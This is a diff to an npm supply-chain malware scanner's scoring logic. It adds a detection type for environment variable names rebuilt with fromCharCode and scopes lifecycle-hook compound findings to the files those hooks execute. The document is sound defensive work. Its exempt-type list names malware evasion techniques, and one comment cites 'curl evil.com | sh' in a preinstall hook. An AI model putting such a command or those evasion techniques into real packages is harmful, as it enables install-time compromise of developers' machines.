@@ -457,7 +457,13 @@ const REACHABILITY_EXEMPT_TYPES = new Set([
   'function_constructor_require',  // AST-086 — Function.constructor("require", body)
   'process_variable_shadow',       // AST-087 — const process = {env:{...}}
   'function_runtime_args',         // AST-090 — new Function('require','__dirname',...)
-  'self_destruct_eval'             // AST-089 — dynamic exec + unlink __filename
+  'self_destruct_eval',            // AST-089 — dynamic exec + unlink __filename
+  // Mini Shai-Hulud campaign (2026-05): env var names reconstructed via
+  // String.fromCharCode() to evade static analysis. Structurally unique to malware —
+  // no legitimate code reconstructs env var names from character codes. Injected files
+  // (router_init.js) are unreachable via require/import but execute via lifecycle hooks
+  // or optionalDependencies with prepare scripts.
+  'env_charcode_reconstruction'    // AST-018 — fromCharCode + process.env[computed]
 ]);
 
 // ============================================
@@ -515,17 +521,27 @@ const SCORING_COMPOUNDS = [
     // C7 : when every component lives only in dist/build/out, the cooccurrence
     // is bundler aggregation (a postinstall mention + a pre-bundled HTTP client
     // with credential fields), not real exfiltration. Skip the compound.
-    excludeIfBundled: true
+    excludeIfBundled: true,
+    // v2.11.11: Scope to lifecycle target file + 1-level imports. On monorepos
+    // (React, Next.js) the unscoped co-occurrence of lifecycle_script + any
+    // suspicious_dataflow anywhere in the repo is noise. The compound should
+    // only fire when the dataflow signal is in the file directly executed by
+    // the lifecycle script or in its static imports.
+    lifecycleScoped: true
   },
   {
     type: 'lifecycle_dangerous_exec',
     requires: ['lifecycle_script', 'dangerous_exec'],
     severity: 'CRITICAL',
     message: 'Lifecycle hook + dangerous shell execution — install-time command injection (scoring compound).',
-    fileFrom: 'dangerous_exec'
+    fileFrom: 'dangerous_exec',
     // No sameFile: lifecycle is package-level
     // dangerous_exec is in DIST_EXEMPT_TYPES so it is never coincidental in
     // dist/ ; no excludeIfBundled gate added here.
+    // v2.11.11: Scope to lifecycle target file + 1-level imports. Without this,
+    // a monorepo postinstall referencing a clean setup script correlates with
+    // exec() in unrelated release/CI scripts → CRITICAL false positive.
+    lifecycleScoped: true
   },
   {
     type: 'obfuscated_lifecycle_env',
@@ -595,13 +611,117 @@ const SCORING_COMPOUNDS = [
   },
 ];
 
+// v2.11.11: Extract static require/import targets from a JS file (1 level).
+// Returns a Set of relative file paths (normalized with forward slashes).
+const _acorn = require('acorn');
+const _acornWalk = require('acorn-walk');
+
+function _extractStaticImports(filePath) {
+  const imports = new Set();
+  try {
+    const content = require('fs').readFileSync(filePath, 'utf8');
+    const ast = _acorn.parse(content, { sourceType: 'module', ecmaVersion: 'latest', allowReturnOutsideFunction: true, allowImportExportEverywhere: true });
+    _acornWalk.simple(ast, {
+      CallExpression(node) {
+        if (node.callee.type === 'Identifier' && node.callee.name === 'require' &&
+            node.arguments.length > 0 && node.arguments[0].type === 'Literal' &&
+            typeof node.arguments[0].value === 'string') {
+          const target = node.arguments[0].value;
+          if (target.startsWith('.')) imports.add(target);
+        }
+      },
+      ImportDeclaration(node) {
+        if (node.source && typeof node.source.value === 'string' && node.source.value.startsWith('.')) {
+          imports.add(node.source.value);
+        }
+      }
+    });
+  } catch { /* parse failure — return empty set */ }
+  return imports;
+}
+
+// v2.11.11: Lifecycle scope resolution. Determines if a lifecycleScoped compound
+// should fire based on whether the non-lifecycle threats are in the lifecycle
+// target file or its direct static imports.
+// Returns: 'pass' (compound should fire), 'skip' (no match in scope), 'unscoped' (can't resolve target)
+const _NODE_FILE_RE = /\bnode\s+(?:\.\/)?([^\s"';&|]+\.(?:js|mjs|cjs))\b/;
+
+function _resolveLifecycleScopeGate(compound, threats, targetPath) {
+  const fs = require('fs');
+  const pathMod = require('path');
+
+  // 1. Extract lifecycle target files from lifecycle_script threats + package.json
+  const lifecycleTargetFiles = new Set();
+  const lifecycleThreats = threats.filter(t => t.type === 'lifecycle_script');
+  for (const lt of lifecycleThreats) {
+    const match = lt.message && _NODE_FILE_RE.exec(lt.message);
+    if (match) lifecycleTargetFiles.add(match[1]);
+  }
+
+  // Also read package.json directly for robustness
+  try {
+    const pkgPath = pathMod.join(targetPath, 'package.json');
+    if (fs.existsSync(pkgPath)) {
+      const pkgData = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
+      const scripts = pkgData.scripts || {};
+      const LIFECYCLE_NAMES = ['preinstall', 'install', 'postinstall', 'preuninstall', 'postuninstall', 'prepare'];
+      for (const name of LIFECYCLE_NAMES) {
+        if (scripts[name]) {
+          const m = _NODE_FILE_RE.exec(scripts[name]);
+          if (m) lifecycleTargetFiles.add(m[1]);
+        }
+      }
+    }
+  } catch { /* ignore */ }
+
+  // 2. If no target file extractable, return 'unscoped'
+  if (lifecycleTargetFiles.size === 0) return 'unscoped';
+
+  // 3. Build the scoped file set: target files + their 1-level static imports
+  const scopedFiles = new Set();
+  for (const relTarget of lifecycleTargetFiles) {
+    const normalized = relTarget.replace(/\\/g, '/');
+    scopedFiles.add(normalized);
+    // Parse the target file and extract its static imports
+    const absTarget = pathMod.resolve(targetPath, relTarget);
+    const imports = _extractStaticImports(absTarget);
+    for (const imp of imports) {
+      // Resolve relative import against the target file's directory
+      const impDir = pathMod.dirname(absTarget);
+      let resolved = pathMod.relative(targetPath, pathMod.resolve(impDir, imp)).replace(/\\/g, '/');
+      // Try with .js extension if not present
+      if (!resolved.match(/\.(js|mjs|cjs)$/)) {
+        if (fs.existsSync(pathMod.resolve(targetPath, resolved + '.js'))) {
+          resolved += '.js';
+        } else if (fs.existsSync(pathMod.resolve(targetPath, resolved, 'index.js'))) {
+          resolved = resolved + '/index.js';
+        }
+      }
+      scopedFiles.add(resolved);
+    }
+  }
+
+  // 4. Check if any non-lifecycle required type has a threat in the scoped file set
+  const nonLifecycleReqs = compound.requires.filter(r => r !== 'lifecycle_script');
+  for (const req of nonLifecycleReqs) {
+    const reqThreats = threats.filter(t => t.type === req && t.file);
+    for (const t of reqThreats) {
+      const normalizedFile = t.file.replace(/\\/g, '/');
+      if (scopedFiles.has(normalizedFile)) return 'pass';
+    }
+  }
+
+  return 'skip';
+}
+
 /**
  * Apply compound boost rules: inject synthetic CRITICAL threats when
  * co-occurring threat types indicate unambiguous malice.
  * Called AFTER applyFPReductions to recover individually-downgraded signals.
  * @param {Array} threats - deduplicated threat array (mutated in place)
+ * @param {string} [targetPath] - scan target directory (for lifecycle scope resolution)
  */
-function applyCompoundBoosts(threats) {
+function applyCompoundBoosts(threats, targetPath) {
   const typeSet = new Set(threats.map(t => t.type));
 
   // Build map of type → first file encountered (for file assignment)
@@ -659,6 +779,36 @@ function applyCompoundBoosts(threats) {
         threats.some(t => t.type === req && t.file && t.file !== 'package.json')
       );
       if (anyFileBearing && allComponentsBundled) continue;
+    }
+
+    // v2.11.11: Lifecycle scope gate. For compounds with lifecycleScoped: true,
+    // the non-lifecycle required type must have at least one threat in the file
+    // directly executed by the lifecycle script OR in its static imports (1 level).
+    // On monorepos, unscoped co-occurrence (lifecycle in package.json + exec in
+    // scripts/release/publish.js) is noise. Fallback: when no target file can be
+    // extracted (e.g. "npm run build"), the compound fires with severity capped
+    // at HIGH and tagged unscopedCompound so the floor-50 logic skips it.
+    if (compound.lifecycleScoped && targetPath) {
+      const scopeResult = _resolveLifecycleScopeGate(compound, threats, targetPath);
+      if (scopeResult === 'skip') continue;
+      if (scopeResult === 'unscoped') {
+        // Can't extract target file — fire but cap severity and tag
+        if (!compoundAlreadyPresent) {
+          const cappedSeverity = compound.severity === 'CRITICAL' ? 'HIGH' : compound.severity;
+          threats.push({
+            type: compound.type,
+            severity: cappedSeverity,
+            message: compound.message + ' (unscoped — lifecycle target not resolvable)',
+            file: typeFileMap[compound.fileFrom] || '(unknown)',
+            count: 1,
+            compound: true,
+            unscopedCompound: true
+          });
+          typeSet.add(compound.type);
+        }
+        continue; // skip the normal push below — already handled
+      }
+      // scopeResult === 'pass' — compound fires normally
     }
 
     // Same-file constraint: required types must appear in at least one common file.
@@ -734,6 +884,16 @@ function applyFPReductions(threats, reachableFiles, packageName, packageDeps, re
   const typeCounts = {};
   for (const t of threats) {
     typeCounts[t.type] = (typeCounts[t.type] || 0) + 1;
+  }
+
+  // Mini Shai-Hulud (2026-05): pre-compute files that contain reachability-exempt
+  // findings. Co-occurring threats in these files are also exempt from the
+  // unreachable downgrade — the exempt finding proves structural malice.
+  const _filesWithExemptThreats = new Set();
+  for (const t of threats) {
+    if (t.file && REACHABILITY_EXEMPT_TYPES.has(t.type)) {
+      _filesWithExemptThreats.add(t.file.replace(/\\/g, '/'));
+    }
   }
 
   const totalThreats = threats.length;
@@ -954,12 +1114,18 @@ function applyFPReductions(threats, reachableFiles, packageName, packageDeps, re
     // Reachability: findings in files not reachable from entry points → LOW
     // Exception: .d.ts files are never require()'d by JS but are executed by ts-node/tsx/bun.
     // Executable code in .d.ts is always malicious — exempt from unreachable downgrade.
+    // Exception 2 (Mini Shai-Hulud, 2026-05): if the same file contains at least one
+    // reachability-exempt finding (env_charcode_reconstruction, function_constructor_require,
+    // etc.), all other findings in that file are also exempt. Rationale: the exempt
+    // finding proves the file contains structurally malicious code, so co-occurring
+    // signals (obfuscation, dataflow, credential harvest) are scoring-relevant regardless
+    // of whether the file is reachable via require/import.
     const isDtsFile = t.file && t.file.endsWith('.d.ts');
     if (reachableFiles && reachableFiles.size > 0 && t.file &&
         !REACHABILITY_EXEMPT_TYPES.has(t.type) &&
         !isPackageLevelThreat(t) && !isDtsFile) {
       const normalizedFile = t.file.replace(/\\/g, '/');
-      if (!reachableFiles.has(normalizedFile)) {
+      if (!reachableFiles.has(normalizedFile) && !_filesWithExemptThreats.has(normalizedFile)) {
         t.reductions.push({ rule: 'unreachable', from: t.severity, to: 'LOW' });
         t.severity = 'LOW';
         t.unreachable = true;
@@ -1139,7 +1305,9 @@ function calculateRiskScore(deduped, intentResult) {
   let packageScore = computeGroupScore(packageLevelThreats);
   // Floor: CRITICAL package-level threats (lifecycle_shell_pipe, IOC match) → minimum HIGH (50)
   // A single "curl evil.com | sh" in preinstall = 25 points = MEDIUM without floor.
-  if (packageScore >= 25 && packageLevelThreats.some(t => t.severity === 'CRITICAL')) {
+  // v2.11.11: unscopedCompound threats (lifecycle target not resolvable) are excluded from
+  // the floor — they represent uncertain correlations that should not inflate the score.
+  if (packageScore >= 25 && packageLevelThreats.some(t => t.severity === 'CRITICAL' && !t.unscopedCompound)) {
     packageScore = Math.max(packageScore, 50);
   }
   // v2.10.94: Co-occurrence floor — 2+ distinct CRITICAL package-level types (different
@@ -1147,7 +1315,7 @@ function calculateRiskScore(deduped, intentResult) {
   // (CRITICAL tier) so the final risk level reflects real severity instead of stopping
   // at HIGH. Catches apache-arrow-14 (curl_env_exfil + lifecycle_env_exfil compound).
   const criticalPkgTypes = new Set(
-    packageLevelThreats.filter(t => t.severity === 'CRITICAL').map(t => t.type)
+    packageLevelThreats.filter(t => t.severity === 'CRITICAL' && !t.unscopedCompound).map(t => t.type)
   );
   if (criticalPkgTypes.size >= 2) {
     packageScore = Math.max(packageScore, 75);
@@ -1176,7 +1344,7 @@ function calculateRiskScore(deduped, intentResult) {
   const boostPackageThreats = deduped.filter(t => isPackageLevelThreat(t) && t.boostSignal);
   if (boostPackageThreats.length > 0) {
     packageScore = computeGroupScore([...packageLevelThreats, ...boostPackageThreats]);
-    if (packageScore >= 25 && [...packageLevelThreats, ...boostPackageThreats].some(t => t.severity === 'CRITICAL')) {
+    if (packageScore >= 25 && [...packageLevelThreats, ...boostPackageThreats].some(t => t.severity === 'CRITICAL' && !t.unscopedCompound)) {
       packageScore = Math.max(packageScore, 50);
     }
   }
